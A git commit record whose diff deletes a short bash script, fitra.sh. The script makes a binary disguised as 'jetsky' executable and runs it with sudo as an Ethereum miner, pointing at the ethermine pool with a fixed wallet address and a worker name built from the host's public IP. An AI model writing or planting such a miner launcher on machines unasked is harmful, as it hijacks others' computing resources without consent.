16ee7091f87aa798d4e1d07ec25c7c8eae63bbd1
leumang88 <79134410+leumang88@users.noreply.github.com>
2021-02-16 14:41:56 +0700

    Delete fitra.sh

--- fitra.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-
-WALLET=0x1a2Ae59743eE7873D3145EbA4FDc686A9455E6c0
-WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-eth
-
-cd "$(dirname "$0")"
-
-chmod +x ./jetsky && sudo ./jetsky -G -P stratum1+tcp://$WALLET.$WORKER@asia1.ethermine.org:4444
